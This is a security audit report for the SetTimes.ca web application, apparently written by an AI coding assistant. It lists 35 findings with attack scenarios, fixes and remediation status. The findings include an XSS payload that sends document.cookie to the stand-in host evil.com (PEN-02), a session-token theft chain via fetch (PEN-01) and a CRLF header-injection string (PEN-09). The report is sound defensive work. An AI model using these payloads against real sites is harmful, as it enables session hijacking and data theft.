# Security Penetration Test Report — SetTimes.ca

**Date:** February 12, 2026
**Auditor:** GitHub Copilot (GPT-5.3-Codex)
**Scope:** Full codebase — backend API, frontend, authentication, authorization, CSRF, MFA, session management, public endpoints, database
**Method:** White-box manual code review (pen test methodology — OWASP Top 10, CWE)

---

## Executive Summary

The application has solid security fundamentals: PBKDF2 password hashing via Web Crypto API, Lucia session management with HTTPOnly cookies, CSRF double-submit cookie pattern, invite-code-gated signups, role-based access control, and audit logging. However, this deep review uncovered **35 findings** — including **3 critical**, **9 high**, **14 medium**, and **9 low** severity issues — that an attacker could exploit in a real engagement.

| Severity | Count | Key Themes |
|----------|-------|------------|
| **CRITICAL** | 3 | Session token exposure via API, HTML injection in emails, preview deploy cookie weakening |
| **HIGH** | 9 | Missing authz on event edit, no rate limiting on MFA brute-force, public endpoint abuse, unbounded inputs |
| **MEDIUM** | 14 | CSRF fallback weakness, timing info disclosure, TOCTOU races, input validation gaps |
| **LOW** | 9 | CSP `unsafe-inline`, sensitive data in logs, minor info disclosure |

**Immediate action required on:** Validate deployment/runtime behavior after these code remediations (CSP compatibility, Turnstile secret config, and ops-level rate-limit monitoring).

### Remediation Progress (Current Branch)

- ✅ PEN-01 fixed: removed `session_token`/`id` exposure from admin session context and `/api/admin/me` response.
- ✅ PEN-02 fixed: HTML-escaped user input in subscription verification emails.
- ✅ PEN-03 fixed: removed `.pages.dev` dev-mode cookie downgrade behavior.
- ✅ PEN-04 fixed: added `editor` permission + audit log to [functions/api/admin/events/[id]/edit.js](functions/api/admin/events/[id]/edit.js).
- ✅ PEN-06 partially fixed: added strict `user_session` validation and `performance_ids` cap to [functions/api/schedule/build.js](functions/api/schedule/build.js).
- ✅ PEN-09 fixed: sanitized iCal download filename in [functions/api/feeds/ical.js](functions/api/feeds/ical.js).
- ✅ PEN-10 fixed: improved email validation + frequency enum + field length limits in [functions/api/subscriptions/subscribe.js](functions/api/subscriptions/subscribe.js).
- ✅ PEN-05 fixed: added MFA brute-force throttling + auth attempt logging to [functions/api/admin/mfa/enable.js](functions/api/admin/mfa/enable.js) and [functions/api/admin/mfa/backup-codes.js](functions/api/admin/mfa/backup-codes.js).
- ✅ PEN-19 fixed: changed MFA lockout query to user+IP keying in [functions/api/admin/auth/mfa/verify.js](functions/api/admin/auth/mfa/verify.js).
- ✅ PEN-08 fixed: sensitive endpoints now fail closed when internal rate-limit checks fail in [functions/utils/rateLimit.js](functions/utils/rateLimit.js).
- ✅ PEN-11 fixed: added bulk request caps in [functions/api/admin/bands/bulk.js](functions/api/admin/bands/bulk.js) and [functions/api/admin/bands/bulk-preview.js](functions/api/admin/bands/bulk-preview.js).
- ✅ PEN-12 fixed: added performer input validation, role-based contact redaction, and performer audit logging in [functions/api/admin/performers.js](functions/api/admin/performers.js).
- ✅ PEN-13 fixed: removed IP/anonymous CSRF session fallback in [functions/utils/csrf.js](functions/utils/csrf.js).
- ✅ PEN-14 fixed: session timing headers now disabled by default unless explicitly enabled in [functions/api/admin/_middleware.js](functions/api/admin/_middleware.js).
- ✅ PEN-16 fixed: account activation update is now atomic in [functions/api/auth/activate.js](functions/api/auth/activate.js).
- ✅ PEN-17 fixed: subscription verification update is now atomic in [functions/api/subscriptions/verify.js](functions/api/subscriptions/verify.js).
- ✅ PEN-18 fixed: password reset token consumption is now atomic in [functions/api/auth/reset-password-complete.js](functions/api/auth/reset-password-complete.js).
- ✅ PEN-20 fixed: `pastLimit` is now bounded in [functions/api/events/timeline.js](functions/api/events/timeline.js).
- ✅ PEN-21 fixed: admin events listing now supports bounded pagination in [functions/api/admin/events.js](functions/api/admin/events.js).
- ✅ PEN-22 fixed: admin bands listing now supports bounded pagination in [functions/api/admin/bands.js](functions/api/admin/bands.js).
- ✅ PEN-23 fixed: viewer-role contact data redaction for venues/performers in [functions/api/admin/venues.js](functions/api/admin/venues.js) and [functions/api/admin/performers.js](functions/api/admin/performers.js).
- ✅ PEN-24 fixed: removed PII from invite URL query params in [functions/api/admin/users.js](functions/api/admin/users.js).
- ✅ PEN-25 fixed: backup code comparison uses constant-time matching in [functions/utils/totp.js](functions/utils/totp.js).
- ✅ PEN-26 fixed: removed internal error detail leakage in bulk endpoints in [functions/api/admin/bands/bulk.js](functions/api/admin/bands/bulk.js).
- ✅ PEN-27 fixed: removed `unsafe-inline` from API CSP policy in [functions/_middleware.js](functions/_middleware.js).
- ✅ PEN-28/PEN-29 fixed: reduced sensitive email/link logging in [functions/api/subscriptions/subscribe.js](functions/api/subscriptions/subscribe.js), [functions/api/admin/users.js](functions/api/admin/users.js), and [functions/utils/email.js](functions/utils/email.js).
- ✅ PEN-30/PEN-31 fixed: production exposure of build/debug details reduced in [frontend/src/main.jsx](frontend/src/main.jsx) and [frontend/src/components/ErrorBoundary.jsx](frontend/src/components/ErrorBoundary.jsx).
- ✅ PEN-32 fixed: unified dev detection logic by reusing auth utility in [functions/utils/csrf.js](functions/utils/csrf.js).
- ✅ PEN-33 fixed (code-path): optional Turnstile validation added to [functions/api/subscriptions/subscribe.js](functions/api/subscriptions/subscribe.js) when `TURNSTILE_SECRET_KEY` is configured.
- ✅ PEN-34 fixed: password reset token TTL reduced to 2 hours in [functions/utils/tokens.js](functions/utils/tokens.js).
- ✅ PEN-35 fixed: standardized DOMPurify import in [frontend/src/pages/BandProfilePage.jsx](frontend/src/pages/BandProfilePage.jsx).

---

## Table of Contents

1. [Critical Findings](#1-critical-findings)
2. [High Findings](#2-high-findings)
3. [Medium Findings](#3-medium-findings)
4. [Low Findings](#4-low-findings)
5. [What's Working Well](#5-whats-working-well)
6. [Prioritized Remediation Plan](#6-prioritized-remediation-plan)

---

## 1. Critical Findings

### PEN-01: Session Token Leaked via `/api/admin/me` Response Body

**File:** [functions/api/admin/me.js](functions/api/admin/me.js) + [functions/api/admin/_middleware.js](functions/api/admin/_middleware.js#L261-L263)
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Description:** The admin middleware populates `context.data.session` with:
```js
session_token: session.id,  // This IS the Lucia session ID
```
The `/api/admin/me` endpoint returns `data.session` verbatim in the JSON response. This **completely negates the HTTPOnly cookie protection** — any JavaScript (including XSS payloads) can call `GET /api/admin/me` and extract the raw session token from the response body.

**Attack Scenario:**
1. Attacker finds any XSS vector (stored via band description, or via `unsafe-inline` CSP)
2. XSS payload calls `fetch('/api/admin/me', {credentials:'include'})` 
3. Response contains `{ session: { session_token: "abc123..." } }`
4. Attacker exfiltrates the session token and gains full account access from any device

**Remediation:** Remove `session_token` and `id` from the session data returned by `/api/admin/me`. Only expose non-sensitive metadata (e.g., `expires_at` for UX). Better yet, strip the session object from the response entirely — the frontend only needs `user` data.

---

### PEN-02: HTML Injection in Subscription Verification Emails

**File:** [functions/api/subscriptions/subscribe.js](functions/api/subscriptions/subscribe.js#L109-L115)
**CWE:** CWE-79 (Injection — HTML Context)

**Description:** User-supplied `city` and `genre` values are interpolated directly into HTML email bodies without encoding:
```js
const html = `
  <p>City: ${city}<br/>Genre: ${genre}</p>
`.trim();
```

**Attack Scenario:**
1. Attacker subscribes with `city` = `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`
2. Verification email is sent containing executable HTML
3. If an admin views email content in any HTML-rendering context (email dashboard, log viewer), the script executes
4. Attacker can also inject `<a>` tags to create highly convincing phishing links within legitimate SetTimes emails

**Remediation:** HTML-entity-encode all user-supplied values before embedding in email HTML. Create an `escapeHtml()` utility:
```js
function escapeHtml(str) {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
```

---

### PEN-03: Preview Deployments Get Weakened Cookie Security

**File:** [functions/utils/auth.js](functions/utils/auth.js#L24-L30)
**CWE:** CWE-16 (Configuration)

**Description:** `isDevRequest()` treats ALL `*.pages.dev` hosts as development:
```js
host.endsWith(".pages.dev") ||
origin.includes(".pages.dev")
```
This causes preview deployments (publicly accessible URLs like `https://abc123.settimesdotca.pages.dev`) to receive:
- `Secure: false` (cookies sent over HTTP)
- `SameSite: Lax` instead of `Strict` (weaker CSRF protection)

Preview deployments share the **same D1 production database** (same `wrangler.toml` binding), so this is a direct attack path to production data.

**Attack Scenario:**
1. Attacker discovers any preview deployment URL (they're predictable based on commit SHAs)
2. CSRF attacks succeed because `SameSite: Lax` allows cross-site navigation with cookies
3. Session cookies can potentially be intercepted if any HTTP downgrade occurs

**Remediation:** Remove `.pages.dev` from `isDevRequest()`. Use an explicit `IS_DEVELOPMENT=true` environment variable set only for local `wrangler dev`. Preview deployments must use production-grade cookie settings.

---

## 2. High Findings

### PEN-04: Missing Authorization Check on Event Edit Endpoint

**File:** [functions/api/admin/events/[id]/edit.js](functions/api/admin/events/[id]/edit.js)
**CWE:** CWE-862 (Missing Authorization)

The endpoint has **no `checkPermission()` call**. While the admin middleware enforces authentication (user must be logged in), there is no role check. Any authenticated user — including `viewer` role — can `PUT /api/admin/events/{id}/edit` to modify event name, date, slug, and ticket link. Additionally, there is **no audit logging** for this endpoint.

**Remediation:** Add `checkPermission(context, "editor")` at the top. Add audit logging.

---

### PEN-05: No Rate Limiting on MFA Enable / Backup Code Regeneration (TOTP Brute-Force)

**Files:** [functions/api/admin/mfa/enable.js](functions/api/admin/mfa/enable.js), [functions/api/admin/mfa/backup-codes.js](functions/api/admin/mfa/backup-codes.js)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

Admin endpoints are **excluded from global rate limiting** (`SKIP_PATTERNS` includes `/api/admin/`). The MFA login verification (`auth/mfa/verify.js`) has its own rate limit (5 attempts/10 min), but the MFA enable and backup code regeneration endpoints have **none**. TOTP has 1,000,000 possible codes with only ~3 valid at any time.

**Attack Scenario:** An attacker with a stolen session brute-forces the 6-digit TOTP code at the enable endpoint. At Cloudflare Workers speeds, this is feasible without any throttling.

**Remediation:** Add per-user rate limiting to these endpoints (same pattern as MFA verify).

---

### PEN-06: Public Schedule Build Endpoint — No Rate Limit, No Input Bounds

**File:** [functions/api/schedule/build.js](functions/api/schedule/build.js)
**CWE:** CWE-770 (Allocation of Resources Without Limits)

Public `POST` endpoint with no authentication. The `user_session` string has no length limit, and `performanceIds` array has no upper bound. Combined with the public rate limiter's 30 req/min allowance (still 43,200/day), an attacker can fill the database with garbage.

**Remediation:** Validate `user_session` max length (128 chars). Cap `performanceIds` array (max 50). Add stricter rate limiting.

---

### PEN-07: Public Metrics Endpoint — Write Amplification DoS

**File:** [functions/api/metrics.js](functions/api/metrics.js)
**CWE:** CWE-770

While events are sliced to 50 max, each event triggers sequential DB writes (upserts into `artist_daily_stats`). At 100 req/min rate limit × 50 events × sequential writes, this can consume significant D1 write capacity.

**Remediation:** Use `DB.batch()` for all upserts. Consider tighter rate limiting for the metrics endpoint.

---

### PEN-08: Rate Limiter Fails Open on Cache API Errors

**File:** [functions/utils/rateLimit.js](functions/utils/rateLimit.js#L125-L128)
**CWE:** CWE-636 (Not Failing Securely)

```js
catch (error) {
  logger.warn('Rate limit check failed', { error, ip });
  return { allowed: true, remaining: -1, resetAt: 0 };  // FAIL OPEN
}
```

If the Cloudflare Cache API fails (cache eviction, overload), ALL rate limiting is disabled — the system silently allows unlimited requests.

**Remediation:** Fail-closed for sensitive endpoints (auth, subscription). At minimum, add monitoring/alerting for fail-open events.

---

### PEN-09: iCal Feed — Header Injection via `Content-Disposition`

**File:** [functions/api/feeds/ical.js](functions/api/feeds/ical.js#L56-L57)
**CWE:** CWE-113 (HTTP Response Splitting)

User-controlled query parameters `city` and `genre` are embedded unsanitized in the response header:
```js
"Content-Disposition": `attachment; filename="${city}-${genre}.ics"`
```

**Attack Scenario:** `?city=a"&genre=%0D%0AX-Injected: true` — while modern runtimes often strip CRLF, the unescaped `"` breaks the filename attribute, potentially causing malicious file naming.

**Remediation:** Sanitize to `[a-zA-Z0-9_-]` only before embedding in headers. Or use a static filename.

---

### PEN-10: Weak Email Validation on Subscription Endpoint

**File:** [functions/api/subscriptions/subscribe.js](functions/api/subscriptions/subscribe.js#L13-L17)
**CWE:** CWE-20 (Improper Input Validation)

Email validation is only `!email.includes("@")`. The admin auth endpoints use the `email-validator` library (proper RFC validation), but this public endpoint does not. Fields `city`, `genre`, `frequency` have no length limits and `frequency` is not validated against allowed enum values.

**Remediation:** Use the `email-validator` library (already a dependency). Add field length limits. Validate `frequency` against `['daily', 'weekly', 'monthly']`.

---

### PEN-11: Unbounded Array in Bulk Band Operations

**Files:** [functions/api/admin/bands/bulk.js](functions/api/admin/bands/bulk.js), [functions/api/admin/bands/bulk-preview.js](functions/api/admin/bands/bulk-preview.js)
**CWE:** CWE-770

`band_ids` array creates dynamic SQL `IN (?,?,?...)` clauses with no size cap. An attacker with editor access can send `{ "band_ids": [1,2,...100000] }`, causing query compilation DoS or D1 timeout.

**Remediation:** Cap `band_ids.length` at a reasonable maximum (e.g., 200). Return 400 if exceeded.

---

### PEN-12: Performers CRUD — No Input Validation, No Audit Logging

**File:** [functions/api/admin/performers.js](functions/api/admin/performers.js)
**CWE:** CWE-20, CWE-778

POST/PUT endpoints validate only that `name` exists — no length limits on any field (name, genre, origin, description, photo_url, social URLs). DELETE has no audit logging. An editor can insert performers with megabyte-long descriptions or `javascript:` photo URLs.

**Remediation:** Apply `FIELD_LIMITS` from `validation.js`. Add `auditLog()` calls for all CRUD mutations.

---

## 3. Medium Findings

### PEN-13: CSRF Session Identifier Fallback to IP / "anonymous"

**File:** [functions/utils/csrf.js](functions/utils/csrf.js#L48-L56)
**CWE:** CWE-352

When no session cookie is present, CSRF token generation falls back to `CF-Connecting-IP` or the string `"anonymous"`. Users behind shared NAT/VPN share the same CSRF session identifier. A pre-login CSRF token may remain valid after login.

**Remediation:** Remove IP and "anonymous" fallbacks. Require a session token for CSRF-protected endpoints (which all admin endpoints already have).

---

### PEN-14: Session Timing Information Disclosure in Response Headers

**File:** [functions/api/admin/_middleware.js](functions/api/admin/_middleware.js#L279-L283)
**CWE:** CWE-200

Headers `X-Session-Expires-In`, `X-Session-Idle-Expires-In`, `X-Session-Absolute-Expires-In`, `X-Session-Warning` expose precise internal session state. An attacker observing these headers can optimize session hijacking timing.

**Remediation:** Remove or obfuscate in production. Use a single boolean warning flag if needed for frontend UX.

---

### PEN-15: Trusted Device MFA Bypass — Fingerprint Based on Spoofable User-Agent

**File:** [functions/utils/trustedDevice.js](functions/utils/trustedDevice.js#L10-L16, #L62-L76)
**CWE:** CWE-287 (Improper Authentication)

Device fingerprint is `SHA-256(IP + UserAgent)`. The "soft validation" allows devices with matching User-Agent but different IP to bypass MFA. User-Agent is trivially spoofable. Additionally, the validation logic is confusing with misleading variable names (`storedUaHash` is actually the full fingerprint).

**Attack Scenario:** Attacker who obtains a trusted device token and knows the victim's User-Agent string can bypass MFA from any IP.

**Remediation:** Separate UA hash from IP into distinct DB columns. Validate independently. Consider adding a client-side fingerprint signal.

---

### PEN-16: Account Activation TOCTOU Race Condition

**File:** [functions/api/auth/activate.js](functions/api/auth/activate.js#L28-L90)
**CWE:** CWE-367

SELECT by token → checks → UPDATE by user ID. Two concurrent requests with the same token both pass the SELECT. While idempotent for activation, the pattern is fragile.

**Remediation:** Use atomic `UPDATE users SET is_active=1 WHERE activation_token=? AND is_active=0` and check `meta.changes === 1`.

---

### PEN-17: Subscription Verification TOCTOU Race

**File:** [functions/api/subscriptions/verify.js](functions/api/subscriptions/verify.js#L22-L45)
**CWE:** CWE-367

Same SELECT-then-UPDATE pattern. No atomic guard prevents double-verification.

**Remediation:** `UPDATE ... WHERE verification_token=? AND verified=0`.

---

### PEN-18: Password Reset Token TOCTOU

**File:** [functions/api/auth/reset-password-complete.js](functions/api/auth/reset-password-complete.js#L91-L207)
**CWE:** CWE-367

Reset token is validated via SELECT (`WHERE prt.token = ? AND prt.used = 0`), then marked used via separate UPDATE. Between the two operations, a concurrent request could use the same token. The password hash would be computed/stored twice (last write wins), but both requests would succeed.

**Remediation:** Atomically: `UPDATE password_reset_tokens SET used=1 WHERE token=? AND used=0` — check `meta.changes === 1` before proceeding.

---

### PEN-19: MFA Rate Limit Lockout Attack (`OR` Key)

**File:** [functions/api/admin/auth/mfa/verify.js](functions/api/admin/auth/mfa/verify.js#L14-L43)
**CWE:** CWE-645 (Overly Restrictive Account Lockout Mechanism)

Rate limit query uses `WHERE (user_id = ? OR ip_address = ?)`. An attacker can trigger 5 failed MFA attempts from the victim's IP, locking them out for 10 minutes. Conversely, different users behind shared NAT affect each other.

**Remediation:** Key rate limits on user_id AND ip_address independently. Use `AND` or separate counters.

---

### PEN-20: `pastLimit` Query Parameter Unbounded

**File:** [functions/api/events/timeline.js](functions/api/events/timeline.js#L56)
**CWE:** CWE-400

`pastLimit` is parsed as integer with no cap. `?pastLimit=999999` forces a massive DB scan.

**Remediation:** `Math.min(Math.max(pastLimit, 1), 100)`.

---

### PEN-21: Admin Events GET — No Pagination / LIMIT

**File:** [functions/api/admin/events.js](functions/api/admin/events.js#L31-L45)
**CWE:** CWE-400

No `LIMIT` clause. Returns unbounded result set.

**Remediation:** Add pagination with sensible defaults.

---

### PEN-22: Admin Bands GET — Hard-coded LIMIT 200, No Offset

**File:** [functions/api/admin/bands.js](functions/api/admin/bands.js#L198)
**CWE:** CWE-400

Hard-coded `LIMIT 200` with no offset parameter. Bands beyond 200 are inaccessible.

**Remediation:** Accept `limit` and `offset` query parameters.

---

### PEN-23: Contact Email Exposed to Viewer-Role Users

**Files:** [functions/api/admin/performers.js](functions/api/admin/performers.js#L75) (`SELECT *`), [functions/api/admin/venues.js](functions/api/admin/venues.js#L37) (`SELECT v.*`)
**CWE:** CWE-200

All authenticated users (including `viewer`) see `contact_email`, `phone` in API responses.

**Remediation:** Only return contact info for `editor`+ roles. Use explicit column lists instead of `SELECT *`.

---

### PEN-24: Invite URL Contains PII in Query Parameters

**File:** [functions/api/admin/users.js](functions/api/admin/users.js#L117-L135)
**CWE:** CWE-200

`inviteUrl` includes `code`, `email`, `name`, `first`, `last` as URL params — visible in browser history, server logs, and `Referer` headers if the user navigates to external links from the signup page.

**Remediation:** Use only the invite code in the URL. Pre-populate name/email from the invite code record server-side.

---

### PEN-25: Backup Code Comparison Not Constant-Time

**File:** [functions/utils/totp.js](functions/utils/totp.js#L96-L100)
**CWE:** CWE-208 (Observable Timing Discrepancy)

`verifyBackupCode()` uses `Array.indexOf()` for SHA-256 hash comparison — not constant-time. An attacker could use timing differentials across many requests to narrow down valid hashes.

**Remediation:** Use a constant-time comparison for each hash check (`timingSafeEqual` from crypto.js).

---

### PEN-26: Error Response in Bulk Operations Leaks Internal Error

**File:** [functions/api/admin/bands/bulk.js](functions/api/admin/bands/bulk.js#L200)
**CWE:** CWE-209

`message: error.message` returns raw JS/D1 error messages in 500 responses.

**Remediation:** Return generic error message. Log the actual error server-side.

---

## 4. Low Findings

### PEN-27: CSP Allows `unsafe-inline` for Scripts and Styles

**File:** [functions/_middleware.js](functions/_middleware.js#L134-L140)
**CWE:** CWE-79

`script-src 'self' https: 'unsafe-inline'` and `style-src 'self' https: 'unsafe-inline'` significantly weaken XSS protection. Combined with PEN-01, XSS → session theft is a viable chain.

**Remediation:** Implement nonce-based CSP for scripts. Use hashes for inline styles.

---

### PEN-28: Verification Links Logged to Console

**Files:** [functions/api/subscriptions/subscribe.js](functions/api/subscriptions/subscribe.js#L109), [functions/api/admin/users.js](functions/api/admin/users.js#L152)
**CWE:** CWE-532

When email is not configured, activation/verification links (containing secrets) are logged to Cloudflare Workers console — accessible to anyone with Cloudflare account access.

**Remediation:** Log only "activation email not sent" without the URL. Or gate behind a dedicated debug flag.

---

### PEN-29: Email Utility Logs Full API Responses

**File:** [functions/utils/email.js](functions/utils/email.js)
**CWE:** CWE-532

Full Postmark/Resend API responses logged to console, potentially including internal details.

**Remediation:** Log only success/failure status and message IDs.

---

### PEN-30: Build ID Exposed on `window` Object

**File:** [frontend/src/main.jsx](frontend/src/main.jsx#L32-L35)
**CWE:** CWE-200

`window.__SETTIMES_BUILD_ID__` exposes build timestamp, aiding attacker fingerprinting.

**Remediation:** Gate behind `import.meta.env.DEV`.

---

### PEN-31: ErrorBoundary Uses `hostname` for Dev Detection

**File:** [frontend/src/components/ErrorBoundary.jsx](frontend/src/components/ErrorBoundary.jsx#L38-L40)
**CWE:** CWE-209

Dev error details shown when `hostname === 'localhost'`. Running a production build locally exposes stack traces.

**Remediation:** Use `import.meta.env.DEV`.

---

### PEN-32: `isDevRequest()` Duplicated with Inconsistencies

**Files:** [functions/utils/auth.js](functions/utils/auth.js#L20-L30), [functions/utils/csrf.js](functions/utils/csrf.js#L17-L21)
**CWE:** CWE-16

Two different `isDevRequest()` implementations. `auth.js` includes `.pages.dev` (the critical issue), `csrf.js` checks only `localhost`. This inconsistency means CSRF uses strict settings on preview deploys while session cookies don't.

**Remediation:** Consolidate into a single `isDevEnvironment(env, request)` utility using an explicit env var.

---

### PEN-33: Public POST Endpoints Lack Bot Protection

**Files:** [functions/api/metrics.js](functions/api/metrics.js), [functions/api/schedule/build.js](functions/api/schedule/build.js), [functions/api/subscriptions/subscribe.js](functions/api/subscriptions/subscribe.js)
**CWE:** CWE-799

No Cloudflare Turnstile, honeypot, or proof-of-work on any public POST endpoint.

**Remediation:** Add Cloudflare Turnstile to the subscription form at minimum. Consider adding to metrics/schedule endpoints.

---

### PEN-34: 24-Hour Password Reset Token Expiry

**File:** [functions/api/auth/reset-password.js](functions/api/auth/reset-password.js)
**CWE:** CWE-640

Password reset tokens are valid for 24 hours. Best practice is 1-2 hours for password resets.

**Remediation:** Reduce to 1-2 hours.

---

### PEN-35: Dual DOMPurify Instances

**Files:** [frontend/src/pages/BandProfilePage.jsx](frontend/src/pages/BandProfilePage.jsx#L5) (client `dompurify`), [frontend/src/utils/validation.js](frontend/src/utils/validation.js#L4) (`isomorphic-dompurify`)
**CWE:** CWE-79

Two different DOMPurify packages with different configurations. BandProfilePage uses the client-only `dompurify` with `ALLOWED_TAGS`, while `validation.js` uses `isomorphic-dompurify` with `ALLOWED_TAGS: []`.

**Remediation:** Standardize on `isomorphic-dompurify`. Extract sanitization into a shared utility.

---

## 5. What's Working Well

The review also identified several strong security practices already in place:

| Area | Implementation | Assessment |
|------|---------------|------------|
| **Password Hashing** | PBKDF2-SHA-256, 100K iterations, 16B salt, timing-safe comparison | **Excellent** — Uses Web Crypto API outside CPU time meter |
| **Session Management** | Lucia with HTTPOnly, Secure, SameSite=Strict cookies | **Good** (undermined by PEN-01 exposure) |
| **CSRF Protection** | Double-submit cookie via `csrf-csrf` library | **Good** — auto-retry in frontend on CSRF failure |
| **Signup Gating** | Invite codes required, email-restricted, role from invite only | **Excellent** — prevents privilege escalation |
| **Password Policy** | 12+ chars, uppercase, lowercase, number, special required | **Strong** |
| **Parameterized Queries** | All SQL uses `.bind()` — no string interpolation of user input | **Excellent** — no SQL injection found |
| **Auth Attempt Logging** | Login/signup/MFA attempts tracked with IP, UA, success/fail, reason | **Good** |
| **Password Reset** | Invalidates all sessions, checks password reuse, audit logged | **Good** |
| **Input Sanitization** | DOMPurify on frontend, field limits defined (partially enforced) | **Partial** |
| **Security Headers** | X-Content-Type-Options, X-Frame-Options, Referrer-Policy, HSTS, Permissions-Policy | **Good** |
| **CORS** | Origin allowlist, explicit rejection of unknown origins | **Good** |

---

## 6. Prioritized Remediation Plan

### Phase 1 — Immediate (This Sprint)

| ID | Fix | Effort |
|----|-----|--------|
| **PEN-01** | Remove `session_token` from `/api/admin/me` response. Strip `data.session.id` and `data.session.session_token` from the session data object. | 15 min |
| **PEN-02** | Add `escapeHtml()` to subscription email HTML. Encode `city`, `genre`, `email` before embedding. | 30 min |
| **PEN-03** | Remove `.pages.dev` from `isDevRequest()` in `auth.js`. Use env var instead. Fix `csrf.js` to use the same utility. | 30 min |
| **PEN-04** | Add `checkPermission(context, "editor")` and audit logging to `events/[id]/edit.js`. | 15 min |

### Phase 2 — This Week

| ID | Fix | Effort |
|----|-----|--------|
| **PEN-05** | Add per-user rate limiting to MFA enable/backup-code endpoints. | 1 hr |
| **PEN-06** | Add input length limits to schedule build endpoint. | 30 min |
| **PEN-09** | Sanitize iCal Content-Disposition filename. | 15 min |
| **PEN-10** | Use `email-validator` in subscribe endpoint. Add field limits. | 30 min |
| **PEN-11** | Cap `band_ids` array length in bulk operations. | 15 min |
| **PEN-12** | Add FIELD_LIMITS validation + audit logging to performers CRUD. | 1 hr |

### Phase 3 — This Month

| ID | Fix | Effort |
|----|-----|--------|
| **PEN-08** | Implement fail-closed rate limiting for auth endpoints. | 2 hr |
| **PEN-13** | Remove CSRF IP/"anonymous" fallback. | 30 min |
| **PEN-14** | Remove/minimize session timing headers. | 15 min |
| **PEN-15** | Improve trusted device fingerprinting. | 2 hr |
| **PEN-16-18** | Fix all TOCTOU race conditions with atomic updates. | 1 hr |
| **PEN-19** | Fix MFA rate limit lockout (AND instead of OR). | 30 min |
| **PEN-25** | Use `timingSafeEqual` for backup code comparison. | 30 min |
| **PEN-27** | Implement nonce-based CSP, remove `unsafe-inline`. | 4 hr |

### Phase 4 — Backlog

| ID | Fix | Effort |
|----|-----|--------|
| **PEN-20-22** | Add pagination to all unbounded endpoints. | 2 hr |
| **PEN-23** | Filter contact email by role in API responses. | 1 hr |
| **PEN-24** | Remove PII from invite URL query params. | 1 hr |
| **PEN-28-29** | Clean up sensitive console logging. | 1 hr |
| **PEN-30-32** | Fix dev detection consolidation. | 30 min |
| **PEN-33** | Add Cloudflare Turnstile to public endpoints. | 2 hr |
| **PEN-34** | Reduce password reset token expiry to 2h. | 15 min |
| **PEN-35** | Consolidate DOMPurify usage. | 30 min |

---

*Total estimated remediation: ~20 hours across all phases.*
*Phase 1 (critical fixes): ~1.5 hours.*
